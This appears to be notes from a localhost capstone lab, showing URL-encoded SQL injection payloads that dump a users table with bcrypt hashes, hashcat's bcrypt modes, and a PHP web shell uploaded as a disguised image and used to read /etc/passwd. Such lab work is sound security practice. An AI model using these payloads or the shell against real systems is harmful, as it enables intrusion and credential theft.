<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>SQL Injection</title>
</head><body>http://localhost/capstone/coffee.php?coffee=1%27%201=1#<br/>
<br/>
<img height="287" src="image.png" width="700"/><br/>
<br/>
http://localhost/capstone/coffee.php?coffee=1%27%20or%201=1%20--%20-<br/>
<img height="336" src="image 2.png" width="550"/><br/>
<br/>
<br/>
Let's try union and we think that there could be 5-7 columns<br/>
It worked for 7 columns<br/>
http://localhost/capstone/coffee.php?coffee=1%27%20union%20select%20null,null,null,null,null,null,null%20--%20-<br/>
<br/>
Will see the type of the column we have string or int ?_?<br/>
http://localhost/capstone/coffee.php?coffee=1%27%20union%20select%20null,null,%27string%27,%27string%27,null,null,null%20--%20-<br/>
<img height="306" src="image 3.png" width="450"/><br/>
<br/>
<br/>
<br/>
http://localhost/capstone/coffee.php?coffee=1%27%20union%20select%20null,TABLE_NAME,%27string%27,null,null,null,null%20FROM%20INFORMATION_SCHEMA.TABLES--%20-<br/>
<br/>
<img height="334" src="image 4.png" width="600"/><br/>
http://localhost/capstone/coffee.php?coffee=1%27%20union%20select%20null,Column_name,%27string%27,null,null,null,null%20FROM%20INFORMATION_SCHEMA.COLUMNS--%20-<br/>
<br/>
users<br/>
user<br/>
username<br/>
password<br/>
<br/>
coffee<br/>
<br/>
<br/>
Will try to get username and password<br/>
http://localhost/capstone/coffee.php?coffee=1%27%20union%20select%20null,username,password,null,null,null,null%20FROM%20users--%20-<br/>
<br/>
As we got the username and hashes(i.e. BCRYPT) let's crack it<br/>
<img height="239" src="image 5.png" width="800"/><br/>
jeremy<br/>
$2y$10$F9bvqz5eoawIS6g0FH.wGOUkNdBYLFBaCSzXvo2HTegQdNg/HlMJy<br/>
<br/>
jessamy<br/>
$2y$10$meh2WXtPZgzZPZrjAmHi2ObKk6uXd2yZio7EB8t.MVuV1KwhWv6yS<br/>
<br/>
raj<br/>
$2y$10$cCXaMFLC.ymTSqu1whYWbuU38RBN900NutjYBvCClqh.UHHg/XfFy<br/>
<br/>
bob<br/>
$2y$10$ojC8YCMKX2r/Suqco/h.TOFTIaw5k3Io5FVSCeWjCCqL8GWwmAczC<br/>
<br/>
maria<br/>
$2y$10$EPM4Unjn4wnn4SjoEPJu7em6OLISImA50QS3T1jCLyh48d7Pv6KBi<br/>
<br/>
amir<br/>
$2y$10$qAXjb233b7CMHc69CU.8ueluFWZDt9f08.XYJjsJ.EfC/O5JGSOqW<br/>
<br/>
xinyi<br/>
$2y$10$37gojoTFmj86E6NbENGg9e2Xu2z6OKKSgnjYxDkXJn/8dvSk2tKfG<br/>
<br/>
kofi<br/>
$2y$10$5sVvPfZOjzRTSeXJtQBGc.CfsDEwvITNkIg2IF9jSBhZZ1Rq.IK3.<br/>
<br/>
<img src="image 6.png"/><br/>
<br/>
┌──(kali㉿kali)-[~]<br/>
└─$ hashcat --help | grep bcrypt<br/>
 3200 | bcrypt $2*$, Blowfish (Unix)                | Operating System<br/>
 25600 | bcrypt(md5($pass)) / bcryptmd5               | Forums, CMS, E-Commerce<br/>
 25800 | bcrypt(sha1($pass)) / bcryptsha1              | Forums, CMS, E-Commerce<br/>
 28400 | bcrypt(sha512($pass)) / bcryptsha512            | Forums, CMS, E-Commerce<br/>
                                                 <br/>
If we remember correct we have different directory from which one was admin<br/>
http://localhost/capstone/admin/admin.php<br/>
<img height="405" src="image 7.png" width="700"/><br/>
<br/>
When we were trying to upload a txt file got an error <br/>
<img height="393" src="image 8.png" width="750"/><br/>
Will simply select the photo and than will insert this php code in image magic bytes and was able to upload it successfully<br/>
&lt;?php system($_GET['cmd']); ?&gt;<br/>
<img height="290" src="image 9.png" width="650"/><br/>
<br/>
<br/>
To see the path will simply go to the main website the click on inspect and got the src of the image<br/>
<img src="image 10.png"/><br/>
&lt;?php system($_GET['cmd']); ?&gt;<img height="113" src="image 11.png" width="650"/><br/>
got the warning for the blank command<br/>
<br/>
<img height="61" src="image 12.png" width="700"/><br/>
<br/>
<br/>
http://localhost/capstone/assets/13.php?cmd=cat%20/etc/passwd<br/>
<img height="241" src="image 13.png" width="650"/><br/>
<br/>
<br/>
<br/>
<br/>
</body></html>